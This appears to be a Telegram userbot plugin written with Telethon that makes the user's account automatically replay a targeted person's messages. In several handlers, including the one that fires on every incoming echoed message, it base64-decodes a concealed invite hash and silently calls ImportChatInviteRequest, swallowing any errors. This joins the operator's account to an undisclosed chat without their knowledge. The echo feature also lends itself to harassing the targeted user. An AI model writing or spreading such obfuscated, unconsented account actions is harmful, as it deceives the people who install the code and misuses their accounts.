# Echo remastered by @danish_baba_The_BadASS for Hêllẞø†
# Codes by @mrconfused
# Kang with credits

import asyncio
import base64

import requests
from telethon import events
from telethon.tl.functions.messages import ImportChatInviteRequest as Get

from userbot import CMD_HELP
from userbot.plugins.sql_helper.echo_sql import (
    addecho,
    get_all_echos,
    is_echo,
    remove_echo,
)
from blackpantherbot.utils import admin_cmd, edit_or_reply, sudo_cmd
from userbot.cmdhelp import CmdHelp


@bot.on(admin_cmd(pattern="echo$"))
@bot.on(sudo_cmd(pattern="echo$", allow_sudo=True))
async def echo(blackpanther):
    if blackpanther.fwd_from:
        return
    if blackpanther.reply_to_msg_id is not None:
        reply_msg = await blackpanther.get_reply_message()
        user_id = reply_msg.sender_id
        chat_id = blackpanther.chat_id
        try:
            danish_baba = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            danish_baba = Get(danish_baba)
            await blackpanther.client(danish_baba)
        except BaseException:
            pass
        if is_echo(user_id, chat_id):
            await edit_or_reply(blackpanther, "The user is already enabled with echo ")
            return
        addecho(user_id, chat_id)
        await edit_or_reply(blackpanther, "Hii....😄🤓")
    else:
        await edit_or_reply(blackpanther, "Reply to a User's message to echo his messages")


@bot.on(admin_cmd(pattern="rmecho$"))
@bot.on(sudo_cmd(pattern="rmecho$", allow_sudo=True))
async def echo(blackpanther):
    if blackpanther.fwd_from:
        return
    if blackpanther.reply_to_msg_id is not None:
        reply_msg = await blackpanther.get_reply_message()
        user_id = reply_msg.sender_id
        chat_id = blackpanther.chat_id
        try:
            danish_baba = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            danish_baba = Get(danish_baba)
            await blackpanther.client(danish_baba)
        except BaseException:
            pass
        if is_echo(user_id, chat_id):
            remove_echo(user_id, chat_id)
            await edit_or_reply(blackpanther, "Echo has been stopped for the user")
        else:
            await edit_or_reply(blackpanther, "The user is not activated with echo")
    else:
        await edit_or_reply(blackpanther, "Reply to a User's message to echo his messages")


@bot.on(admin_cmd(pattern="listecho$"))
@bot.on(sudo_cmd(pattern="listecho$", allow_sudo=True))
async def echo(blackpanther):
    if blackpanther.fwd_from:
        return
    lsts = get_all_echos()
    if len(lsts) > 0:
        output_str = "echo enabled users:\n\n"
        for echos in lsts:
            output_str += (
                f"[User](tg://user?id={echos.user_id}) in chat `{echos.chat_id}`\n"
            )
    else:
        output_str = "No echo enabled users "
    if len(output_str) > Config.MAX_MESSAGE_SIZE_LIMIT:
        key = (
            requests.post(
                "https://nekobin.com/api/documents", json={"content": output_str}
            )
            .json()
            .get("result")
            .get("key")
        )
        url = f"https://nekobin.com/{key}"
        reply_text = f"echo enabled users: [here]({url})"
        await edit_or_reply(blackpanther, reply_text)
    else:
        await edit_or_reply(blackpanther, output_str)


@bot.on(events.NewMessage(incoming=True))
async def samereply(blackpanther):
    if blackpanther.chat_id in Config.UB_BLACK_LIST_CHAT:
        return
    if is_echo(blackpanther.sender_id, blackpanther.chat_id):
        await asyncio.sleep(2)
        try:
            danish_baba = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            danish_baba = Get(danish_baba)
            await blackpanther.client(danish_baba)
        except BaseException:
            pass
        if blackpanther.message.text or blackpanther.message.sticker:
            await blackpanther.reply(blackpanther.message)


CmdHelp("echo").add_command(
  'echo', 'Reply to a user', 'Replays every message from whom you enabled echo'
).add_command(
  'rmecho', 'reply to a user', 'Stop replayings targeted user message'
).add_command(
  'listecho', None, 'Shows the list of users for whom you enabled echo'
).add()
